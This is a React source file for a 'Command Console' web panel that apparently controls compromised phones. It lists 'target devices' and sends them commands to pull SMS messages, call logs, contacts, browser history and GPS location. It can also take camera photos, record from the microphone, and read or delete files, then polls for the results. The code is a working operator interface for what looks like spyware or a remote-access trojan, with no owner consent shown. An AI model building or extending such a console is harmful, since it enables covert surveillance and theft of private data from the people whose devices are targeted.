import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import { api } from '../api/client';
import Icon, { statusIcon } from '../components/ui/Icon';

const COMMAND_MODULES = [
    {
        name: 'File Management',
        icon: 'fileTree',
        commands: [
            { id: 'file_list', name: 'List Directory', description: 'List files in a directory' },
            { id: 'file_read', name: 'Read File', description: 'Read contents of a file' },
            { id: 'file_delete', name: 'Delete File', description: 'Delete a file or directory' },
        ]
    },
    {
        name: 'Contacts & Communications',
        icon: 'contacts',
        commands: [
            { id: 'get_contacts', name: 'Get Contacts', description: 'Retrieve device contacts' },
            { id: 'get_call_logs', name: 'Get Call Logs', description: 'Retrieve call history' },
            { id: 'get_sms_messages', name: 'Get SMS Messages', description: 'Retrieve SMS messages' },
        ]
    },
    {
        name: 'Camera',
        icon: 'camera',
        commands: [
            { id: 'camera_snapshot', name: 'Take Photo', description: 'Capture photo from camera' },
        ]
    },
    {
        name: 'Microphone',
        icon: 'mic',
        commands: [
            { id: 'mic_start', name: 'Start Recording', description: 'Start audio recording' },
            { id: 'mic_stop', name: 'Stop Recording', description: 'Stop audio recording' },
        ]
    },
    {
        name: 'Device Information',
        icon: 'info',
        commands: [
            { id: 'get_device_info', name: 'Device Info', description: 'Get device specifications' },
            { id: 'get_location', name: 'Get Location', description: 'Retrieve GPS coordinates' },
            { id: 'get_foreground_app', name: 'Foreground App', description: 'Get current app' },
        ]
    },
    {
        name: 'Browser & Apps',
        icon: 'globe',
        commands: [
            { id: 'get_browser_history', name: 'Browser History', description: 'Get browsing history' },
            { id: 'get_installed_apps', name: 'Installed Apps', description: 'List installed applications' },
        ]
    },
];

export default function CommandConsole() {
    const [searchParams] = useSearchParams();
    const [devices, setDevices] = useState([]);
    const [selectedDevice, setSelectedDevice] = useState(searchParams.get('device') || '');
    const [selectedCommand, setSelectedCommand] = useState(null);
    const [commandPayload, setCommandPayload] = useState({});
    const [isExecuting, setIsExecuting] = useState(false);
    const [results, setResults] = useState([]);
    const [loading, setLoading] = useState(true);

    useEffect(() => {
        loadDevices();
    }, []);

    const loadDevices = async () => {
        try {
            setLoading(true);
            const data = await api.getDevices();
            setDevices(data.devices || []);
        } catch (err) {
            addResult('error', 'Failed to load devices', err.message);
        } finally {
            setLoading(false);
        }
    };

    const addResult = (status, title, data) => {
        setResults(prev => [{
            id: Date.now(),
            status,
            title,
            data,
            timestamp: new Date(),
            transactionId: `TX-${Date.now().toString(36).toUpperCase()}`
        }, ...prev]);
    };

    const executeCommand = async () => {
        if (!selectedDevice) {
            addResult('error', 'No Device Selected', 'Please select a device first');
            return;
        }
        if (!selectedCommand) {
            addResult('error', 'No Command Selected', 'Please select a command');
            return;
        }

        setIsExecuting(true);

        try {
            addResult('pending', `Executing: ${selectedCommand.name}`, 'Command sent...');

            const response = await api.executeCommand(
                selectedDevice,
                selectedCommand.id,
                commandPayload
            );

            // Poll for result
            pollCommandResult(response.transaction_id, selectedCommand.name);
        } catch (err) {
            addResult('error', `Command Failed: ${selectedCommand.name}`, err.message);
            setIsExecuting(false);
        }
    };

    const pollCommandResult = async (transactionId, commandName) => {
        const maxAttempts = 30;
        let attempts = 0;

        const poll = async () => {
            try {
                const status = await api.getCommandStatus(transactionId);

                if (status.status === 'success' || status.status === 'failed' || status.status === 'timeout') {
                    setIsExecuting(false);

                    if (status.status === 'success') {
                        let displayData = status.data;
                        try {
                            displayData = JSON.stringify(JSON.parse(status.data), null, 2);
                        } catch {
                            // Not JSON
                        }
                        addResult('success', `${commandName} - Success`, displayData);
                    } else {
                        addResult('error', `${commandName} - ${status.status}`, status.error || 'Unknown error');
                    }
                    return;
                }

                attempts++;
                if (attempts < maxAttempts) {
                    setTimeout(poll, 1000);
                } else {
                    setIsExecuting(false);
                    addResult('error', `${commandName} - Timeout`, 'Command timed out');
                }
            } catch (err) {
                setIsExecuting(false);
                addResult('error', `${commandName} - Error`, err.message);
            }
        };

        poll();
    };

    const getPayloadFields = () => {
        if (!selectedCommand) return [];

        switch (selectedCommand.id) {
            case 'file_list':
            case 'file_read':
            case 'file_delete':
                return [{ name: 'path', label: 'File/Directory Path', type: 'text', default: '/' }];
            case 'camera_snapshot':
                return [{ name: 'camera', label: 'Camera', type: 'select', options: ['back', 'front'], default: 'back' }];
            case 'mic_start':
                return [{ name: 'duration', label: 'Duration (seconds)', type: 'number', default: 60 }];
            default:
                return [];
        }
    };

    return (
        <div className="command-console">
            <header className="page-header">
                <h1>Command Console</h1>
                <button className="btn-secondary" onClick={() => setResults([])}>
                    <Icon name="trash" size={16} />
                    Clear Results
                </button>
            </header>

            <div className="console-layout">
                {/* Command Selection Panel */}
                <aside className="command-panel">
                    <div className="device-selector">
                        <label>Target Device</label>
                        <select
                            value={selectedDevice}
                            onChange={(e) => setSelectedDevice(e.target.value)}
                            disabled={loading}
                        >
                            <option value="">Select a device...</option>
                            {devices.map(device => (
                                <option key={device.id} value={device.id}>
                                    {device.friendly_name} ({device.status})
                                </option>
                            ))}
                        </select>
                    </div>

                    <div className="command-modules">
                        {COMMAND_MODULES.map(module => (
                            <div key={module.name} className="command-module">
                                <h3>
                                    <span className="module-icon"><Icon name={module.icon} size={18} /></span>
                                    {module.name}
                                </h3>
                                <div className="command-list">
                                    {module.commands.map(cmd => (
                                        <button
                                            key={cmd.id}
                                            className={`command-btn ${selectedCommand?.id === cmd.id ? 'selected' : ''}`}
                                            onClick={() => {
                                                setSelectedCommand(cmd);
                                                setCommandPayload({});
                                            }}
                                        >
                                            <span className="cmd-name">{cmd.name}</span>
                                            <span className="cmd-desc">{cmd.description}</span>
                                        </button>
                                    ))}
                                </div>
                            </div>
                        ))}
                    </div>
                </aside>

                {/* Execution Panel */}
                <main className="execution-panel">
                    {selectedCommand ? (
                        <>
                            <div className="command-config">
                                <h2>Execute: {selectedCommand.name}</h2>
                                <p className="command-description">{selectedCommand.description}</p>

                                <div className="payload-fields">
                                    {getPayloadFields().map(field => (
                                        <div key={field.name} className="field-group">
                                            <label>{field.label}</label>
                                            {field.type === 'select' ? (
                                                <select
                                                    value={commandPayload[field.name] || field.default}
                                                    onChange={(e) => setCommandPayload(prev => ({
                                                        ...prev,
                                                        [field.name]: e.target.value
                                                    }))}
                                                >
                                                    {field.options.map(opt => (
                                                        <option key={opt} value={opt}>{opt}</option>
                                                    ))}
                                                </select>
                                            ) : (
                                                <input
                                                    type={field.type}
                                                    value={commandPayload[field.name] || field.default || ''}
                                                    onChange={(e) => setCommandPayload(prev => ({
                                                        ...prev,
                                                        [field.name]: field.type === 'number' ? parseInt(e.target.value) : e.target.value
                                                    }))}
                                                />
                                            )}
                                        </div>
                                    ))}
                                </div>

                                <button
                                    className="btn-primary execute-btn"
                                    onClick={executeCommand}
                                    disabled={isExecuting || !selectedDevice}
                                >
                                    {isExecuting ? (
                                        <>
                                            <span className="spinner-small"></span>
                                            Executing...
                                        </>
                                    ) : (
                                        <><Icon name="console" size={17} /> Execute Command</>
                                    )}
                                </button>
                            </div>
                        </>
                    ) : (
                        <div className="no-command-selected">
                            <div className="empty-state-icon"><Icon name="keyboard" size={44} strokeWidth={1.7} /></div>
                            <h2>Select a Command</h2>
                            <p>Choose a command from the left panel to execute on the target device</p>
                        </div>
                    )}

                    {/* Results */}
                    {results.length > 0 && (
                        <div className="results-section">
                            <h3>Results</h3>
                            <div className="results-list">
                                {results.map(result => (
                                    <div key={result.id} className={`result-item ${result.status}`}>
                                        <div className="result-header">
                                            <span className={`result-status ${result.status}`} aria-label={`${result.status} result`}>
                                                <Icon
                                                    name={statusIcon(result.status)}
                                                    size={17}
                                                    className={result.status === 'pending' ? 'spin' : ''}
                                                />
                                            </span>
                                            <span className="result-title">{result.title}</span>
                                            <span className="result-txn">{result.transactionId}</span>
                                            <span className="result-time">
                                                {result.timestamp.toLocaleTimeString()}
                                            </span>
                                        </div>
                                        <pre className="result-data">
                                            {typeof result.data === 'string'
                                                ? result.data
                                                : JSON.stringify(result.data, null, 2)}
                                        </pre>
                                    </div>
                                ))}
                            </div>
                        </div>
                    )}
                </main>
            </div>
        </div>
    );
}
